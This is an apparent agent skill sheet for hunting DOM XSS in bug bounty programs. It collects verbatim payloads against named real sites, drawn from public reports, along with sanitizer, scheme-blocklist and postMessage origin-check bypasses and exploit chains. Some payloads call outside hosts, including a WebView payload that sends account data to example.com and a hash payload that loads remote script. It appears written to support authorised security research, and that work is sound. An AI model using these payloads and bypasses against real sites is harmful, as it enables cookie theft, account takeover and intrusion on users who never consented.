---
name: hunter-l3-dom-xss
description: "Use when hunting DOM XSS on a target. Loads the L3 technique sheet: DOM XSS differs from reflected XSS in that the sink is client-side JavaScript (innerHTML, document.write, location assignment, eval, jQuery $(), $.getScript) and the source is attacker-controlled brow"
domain: cybersecurity
subdomain: web
tags:
- web
- dom-xss
- hunting
- l3
version: '1.0'
---

# DOM XSS — Technique Sheet

## Overview
DOM XSS differs from reflected XSS in that the sink is client-side JavaScript (innerHTML, document.write, location assignment, eval, jQuery $(), $.getScript) and the source is attacker-controlled browser context (URL hash/fragment, query params, document.referrer, postMessage events, clipboard). It pays because server-side WAFs and output encoding never see the payload — the URL is often benign and the exploit happens entirely in the victim's browser. The highest-value sub-patterns are hash/fragment injection (no server logging), javascript: URL injection into location sinks, and postMessage handler abuse (origin-check bypasses).

## Distinct sub-patterns

### 1. URL hash/fragment reflected into innerHTML
- Endpoint shape: any page where client JS reads location.hash or document.URL and writes into the DOM.
  - `GET /checkout-success/{num}#fragment` (LeaseWeb, id=105688)
  - `GET /KBExternal/pages/infasearchltd.aspx?#...` (Informatica, id=156166)
  - `GET /is#?cvo_sid1=...` (Slack, id=146336)
  - `GET /account/signin` jQuery tabs parseHTML sink (Starbucks, id=241619)
  - Twenty Fifteen genericons `example.html#...` (Slack, id=196624)
  - Twitter content page fragment (X/xAI, id=33091)
- Payloads (verbatim):
  - `https://www.leaseweb.com/checkout-success/16893#"><img src=x onerror=alert(document.cookie)>`
  - `?#"><img src=x onerror=alert(document.domain)>&infasearch.aspx=hek`
  - `https://slack.com/is#?cvo_sid1=111&;typ=55577]")%3balert(document.cookie)%3b//`
  - `https://store.starbucks.co.uk/#<img/src="1"/onerror=alert(1)>`
  - `https://content.twitter.com/small-business-guide/# onmouseover=alert('XSS')`
- Root cause: fragment is never sent to the server, so the payload is entirely client-side; the app concatenates the raw fragment (or document.URL) into innerHTML.
- Impact: alert(document.cookie) / alert(document.domain) executed in victim's browser regardless of auth state (LeaseWeb); account takeover possible via cookie theft (Slack, Starbucks).
- Exemplars: 105688, 156166.

Variant — jQuery selector sink: Starbucks (id=188185) put `#a.remote[href$=<img onerror="alert(document.domain)" src=x.jpg/>` in the hash; jQuery 1.10.1 parsed hash into `DIV.innerHTML`. Works on older jQuery where `$(hash)` is a selector, not text.

Variant — JS-breaking injection: Slack (id=146336) injected through `cvo_sid1` in the hash into a convertro call, using `%3b` (`;`) encoding to bypass a semicolon restriction and break out of a JS string: `...typ=55577]")%3balert(document.cookie)%3b//`.

### 2. javascript: URL in location sinks / redirect params
- Endpoint shape: any parameter fed to `document.location = ...`, `location.replace()`, `window.open()`, or an anchor href.
  - `GET /pub/fujitsu/fm3v2/player/attach.html` query string (Informatica, id=1004833) — payload `?javascript:alert(1)` into `document.location.replace()`
  - `GET /{redacted}` backURL (DoD, id=1159255) — `javascript:alert(document.domain)` reflected into "Back to Search Result" href
  - `GET /activation.php?act=activate_mobile` return (VK, id=146939)
  - `GET /` redirect (Semmle, id=361287) — `javascript:prompt(document.domain)%2f%2f` after login
  - Checkout redirect (RBKmoney, id=299924) — plain `javascript:` executed on successful invoice payment
  - TikTok `__hack_redirect_now__` (id=2007093), TikTok `/login` redirect_url (id=2583874)
- Root cause: the code validates presence, not scheme — or doesn't validate at all. javascript: URLs assigned to location or href execute in the page's origin.
- Impact: script execution in page context; Semmle case allowed acting as a victim who logs in after visiting the malicious URL; TikTok login case → account takeover.
- Exemplars: 1004833, 1159255.

### 3. Sanitizer/filter bypass via encoding or malformed markup
- Endpoint shape: params with known filtering that can be defeated.
  - Ubiquiti `/form.html?p=...` (id=158484) — `removeTags` didn't handle attribute context; payload `%27%20onmouseover=alert(document.domain)//`
  - Grab `/sg/partnerships/` (id=2473548→247246) — payload `%3C%3Ca/%3A%3C%22a%22%3Eimg%20src%3D%23%20onerror%3Dconfirm%28%27XSSED%27%29%3E`; stripHtml regex bypassed with malformed tags (`<<a/:<"a">img...`)
  - Starbucks `/account/signin` ReturnUrl (id=526265) — payload `%09Jav%09ascript:alert(document.domain)`; hex/control chars (0x00–0x1F) inside the scheme name defeat a naive scheme blocklist
  - DoD troubleshoot.html username (id=377264) — `--><button/autofocus/onfocus=Function("confirm`1`")();//name="XSS` — comment breakout plus autofocus/onfocus event handler, avoiding script tags
  - DoD smpwservices.fcc USERNAME (id=1982099) — unicode-escaped payload `\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e` (SiteMinder CVE-2013-5968)
  - WordPress subcat (id=230435) — plain `"><img src=x onerror=alert(document.domain)>` when no filter exists
- Root cause: regex-based strip/escape functions are context-unaware; control characters and malformed tag syntax break parsers differently than the filter's model.
- Impact: alert/confirm of domain; cookie theft → account takeover (Starbucks signin).
- Exemplars: 158484, 247246, 526265.

### 4. postMessage handlers: missing or weak origin validation
- Endpoint shape: `window.addEventListener('message', ...)` writing event.data into innerHTML, eval, or navigation.
  - Lyst notes.html (id=1031644): handler `notes.innerHTML = marked(data.notes)` — no origin check at all.
  - Shopify digital_wallets/dialog (id=231053): accepts any origin; the escape function mutates objects in place, so a `File` object's read-only `name` property (own-property check fails) is never escaped — payload via `postMessage` with a File as a lineItem.
  - Shopify google_maps sandbox (id=423218): origin validated but message contents fully trusted — `{"action": "createMapAndMarkers", "body": [{"title": "<img src=xx: onerror=alert(document.domain)>"}]}` rendered as map label HTML.
  - Jetpack Likes (Automattic, id=2371019): origin check only — bypassable once you have XSS on widgets.wp.com (chained: `custom[0][name]` reflected param → DOM XSS on widgets.wp.com → trusted-origin postMessage into Jetpack Likes `avatar_url` → `"><img src onerror=alert()>`).
  - Shopify preview_bar (id=381192), Upserve login (id=603764), HackerOne Marketo forms2.min.js (id=499030): origin validated with `indexOf` / `e.origin.indexOf("https://hq.upserve.com")` — attacker registers a suffix/prefix domain (e.g. `hq.upserve.com.mydomain.com`, `app-sj17.ma` for `app-sj17.marketo.com`, ~60 EUR domain) and passes the check. Upserve's handler then `eval(e.data["exec"])`.
- Root cause: no origin check, truthy contents trust, or substring origin matching instead of exact equality.
- Impact: Shopify digital wallets — alert(document.domain) on any Shopify shop with zero user interaction; Upserve — login credentials logged/stolen; Jetpack — 100k+ sites affected; HackerOne — JS execution context.
- Exemplars: 231053, 603764, 381192.

### 5. postMessage API handlers navigating to javascript: URLs
- Endpoint shape: embedded-app SDK message handlers that redirect/navigate.
  - `{"message":"Shopify.API.setWindowLocation","data":"javascript:alert(document.domain);0[0]"}` (id=422043)
  - `{"message":"Shopify.API.remoteRedirect","data":{"location":"javascript:alert(document.domain)"}}` (id=576532, admin/themes; id=646505 apple-business-chat with `javascript:eval(atob('${payload}'))`)
  - `Shopify.API.Modal.initialize` with `data.src` = javascript: URL (id=602767)
- Root cause: SDK navigation methods accept arbitrary protocols in the data payload; no scheme allowlist.
- Impact: XSS in Shopify admin under victim admin session → CSRF token theft, shop config change, password change, add administrators (646505). Chained with cookie stuffing + login CSRF in 422043.
- Exemplars: 422043, 576532.

### 6. jQuery / legacy sink APIs fed untrusted strings
- Endpoint shape: `$(untrusted)` where untrusted looks like a selector but is HTML; `document.write`; `$.getScript`.
  - TweetDeck `followSourceLink` passed tweet source (client app name) into jQuery `$()`: payload `<svg onload=alert(document.domain)>` (X/xAI, id=119471).
  - Grab lodash perf page: `perf-ui.js` does `document.write` with `build`/`other` GET params; payload `lodash%22%3E%3C/script%3E%3Ch1%3Evagg-a-bond%20is%20here%20:D%3C/h1%3E%3Cimg%20src=1%20onerror=alert(1)%3E` (id=248560).
  - GoCD `/analytics?msg=`: `$(document.body).html()`; payload `?msg=%3Csvg%2Fonload%3Dalert%28%22XSS%22%29%20%3E` (id=2433634).
  - Gatecoin tv-chart.html: `$.getScript(urlParams.indicatorsFile)` from hash — `#indicatorsFile=//blackfan.ru/tv-chart-poc&disabledFeatures=[]&enabledFeatures=[]` loads external JS (id=351275).
  - HackerOne /careers: Masonry appends `leverParameter` from window.location.href via jQuery; payload `?lever-#aaa"><script src="https://app-sj17.marketo.com/index.php/form/getForm?callback=alert"></script>` (id=474656).
- Root cause: jQuery treats strings starting with `<` as HTML; document.write/getScript execute raw.
- Impact: script execution; Gatecoin case executed remote attacker JS; HackerOne case worked on IE/Edge but CSP blocked full exploitation.
- Exemplars: 119471, 351275, 248560.

### 7. base href hijack
- Endpoint shape: page sets `<base href=window.location.pathname>`.
- Payload: `https://alpha.informatica.com//assessmentBase/assessment.html` — protocol-relative double-slash makes the base resolve to host `assessmentbase` (attacker-registerable).
- Root cause: unsanitized pathname into base href; relative resource URLs (e.g. `/etc/designs/...`) then resolve against the attacker domain.
- Impact: demonstrated base-hijack; becomes reflected XSS if the attacker registers the derived domain.
- Exemplar: 158749.

### 8. Clipboard/paste injection
- Endpoint shape: paste handler on Markdown fields reading `text/x-gfm-html` clipboard flavor.
- Payload: `XSS<img/src/onerror=alert(1)>` — copy_as_gfm.js `pasteGFM` assigns unsanitized clipboard HTML to `div.innerHTML` on paste.
- Impact: arbitrary JS under user's credentials on paste; no URL needed — the payload rides the clipboard.
- Exemplar: 1196958.

### 9. Untrusted data into native/app bridges and WebViews
- Endpoint shape: mobile WebView loading URLs with JS enabled and native bridge interfaces exposed.
  - Basecamp Android: payload `https://3.basecamp.com/XXXXX/p","advance","---"); /* comment */ window.location.replace("https://example.com?exfiltration="+nativeBridge.getPage().accountName); //` — JS string breakout in the WebView URL; reaches `nativeBridge` methods.
  - Brave iOS RSS: `<link rel="alternate" type="text/html" href="javascript:alert(document.domain)" />` in attacker-added feed; tapping executes on the privileged `http://localhost:65XX` origin hosting internal features.
- Impact: Basecamp — exfiltrated account email, bucket name, title, cookies via nativeBridge; Brave — execution on privileged internal origin.
- Exemplars: 1343300, 1184379.

### 10. Filename/path-as-HTML (authenticated DOM XSS)
- Endpoint shape: client renders a local filename with `innerHTML` instead of `textContent`.
- Payload: a crafted `.zip` filename: `<button formaction=&#47;40002&#47;users&#47;...&#47;email_addresses formmethod=post name=email_address value=attacker@example.com>Take over.zip`
- Root cause: filename treated as markup in the authenticated import page; the injected button submits an email-change POST to attacker's formaction.
- Impact: full victim account takeover — email changed, confirmation link redeemed, fresh authenticated session obtained.
- Exemplar: 3608199.

### 11. Outdated/vulnerable third-party JS libraries
- Endpoint shape: any page shipping a known-vulnerable client lib.
  - Swagger UI via `configUrl`: `?configUrl=https://jumpy-floor.surge.sh/test.json` (MTN, id=2321874; Adobe adobedocs.github.io, id=1744212).
  - prettyPhoto 3.1.5 served by jsDelivr CDN (id=62385) — all downstream sites vulnerable.
  - Legacy tinymce 2.4.0 (Shopify, id=262230) — renders attacker-supplied dragged HTML via `dataTransfer.setData('text/html', ...)`.
- Impact: MTN — alert popup, assessor noted likely account takeover of `*.mtn.com` apps; jsDelivr — ecosystem-wide exposure.
- Exemplars: 2321874, 62385.

### 12. Parameter → innerHTML via client frameworks/JSON config
- Endpoint shape: attacker controls both a `shop`/config parameter and the JSON it points to.
  - Shopify widgets.shopifyapps.com: attacker-hosted product JSON with `"stripping":false` disables stripHTML; payload title `<option/><select/><img src=xx: onerror=alert('bored-engineer')>` (id=246794).
  - Ubiquiti/Algolia github-btn.html: `text.innerHTML = 'Follow @' + user`; payload wrapped in an IE-forcing meta + iframe: `<meta http-equiv="X-UA-Compatible" content="IE=9"><iframe src='http://nutty.ubnt.com/github-btn.html?%23&user=yrdy<script>alert(document.domain);alert(document.cookie);//&type=follow'></iframe>` (ids 200753, 200826) — same widget affected many domains.
  - DuckDuckGo 50x.html `atb` param: payload `test"/><img src=x onerror=alert('test');>` on error pages (id=426275).
  - Khan Academy discussion URL path: `<img src=x onerror=alert(4)>` parsed into DOM (id=6352).
  - Rockstar localized pages: DOM XSS chained with open redirect to exfiltrate tokens via Referer (id=508517).
  - Uber uberpay-mock-psp: `"><svg onload=alert(1)>` (id=1767151).
  - Algolia Awesome Autocomplete browser extension rendered result HTML un-sanitized into github.com context via repo name `a'"><h1` (id=220494).
- Exemplars: 246794, 200753, 426275.

## Bypass / chain notes
- Control characters (0x00–0x1F, e.g. `%09` tab) inside scheme names defeat naive `javascript:` blocklists (Starbucks 526265).
- `%3b`-encoded semicolons defeat filters that split on `;` (Slack 146336).
- Malformed/mixed-up markup (`<<a/:<"a">img src=# onerror=...>`) bypasses regex stripHtml (Grab 247246); `--><button/autofocus/onfocus=...` breaks out of comments and avoids `<script>` (DoD 377264).
- Origin checks: substring `indexOf` matching is bypassable by registering prefix/suffix lookalike domains — `hq.upserve.com.mydomain.com` (Upserve), `app-sj17.ma` for `app-sj17.marketo.com` (~60 EUR, HackerOne), `foo.my` for `foo.myshopify.com` (Shopify preview bar).
- Escape-bypass via object mutation: escaping functions that only overwrite own enumerable properties never touch read-only properties like `File.name` (Shopify 231053).
- Common chains seen: reflected DOM XSS on a related subdomain → trusted-origin postMessage (Jetpack 2371019); DOM XSS → open redirect → token exfiltration via Referer (Rockstar 508517); by-design store XSS → iframe embedded app → postMessage javascript: URL → cookie stuffing + login CSRF (Shopify 422043); Android WebView JS string breakout → nativeBridge data exfiltration (Basecamp 1343300).
- IE-forcing wrapper (`<meta http-equiv="X-UA-Compatible" content="IE=9">` + iframe) to reach weaker parsing (Ubiquiti/Algolia github-btn).

## Gotchas / what NOT to do
- Check CSP before assuming script execution: Basecamp hey.com (1010132) and HackerOne careers (474656) showed HTML injection but CSP blocked scripts — report accordingly; look for CSP host-whitelist weaknesses.
- Some sinks need user interaction: backURL (1159255) required a click; Brave RSS required a tap; Twitter fragment needed mouseover; GitHub paste XSS needed a paste. State the interaction clearly.
- javascript: URL in a redirect param is often triaged as open redirect — demonstrate execution (alert/confirm in page context) to claim XSS.
- Hash/fragment payloads don't hit server logs or WAFs — that's why they work, but also why some programs want proof; include a screenshot/PoC.
- Don't assume parameter presence means exploitability: Shopify google_maps validated origin correctly but failed on contents; the bug was trust-after-validation, not the origin check itself.
- DOM XSS on browser-extension-rendered content (Algolia extension) lands on the host page's origin — verify it's in scope.

## Real-world impact examples
- Full account takeover via filename HTML injection → email change → session theft (Basecamp 3608199).
- Native bridge exfiltration of account email + cookies from Android WebView (Basecamp 1343300).
- Alert(document.domain) on any Shopify shop with zero interaction, affecting every shop (231053); admin-panel XSS enabling CSRF-token theft and password change (576532, 422043).
- 100k+ Jetpack-enabled sites vulnerable via widgets.wp.com → Jetpack Likes chain (2371019).
- Cookie theft on sign-in pages leading to takeover (Starbucks 526265; Slack 146336 states victim could lose account control).
- Execution on privileged internal origins: Brave's `localhost:65XX` (1184379).
- Ecosystem-wide: jsDelivr serving vulnerable prettyPhoto 3.1.5 exposed all sites using it (62385); github-btn.html widget XSS affected ubnt.com and algolia.com simultaneously (200753/200826).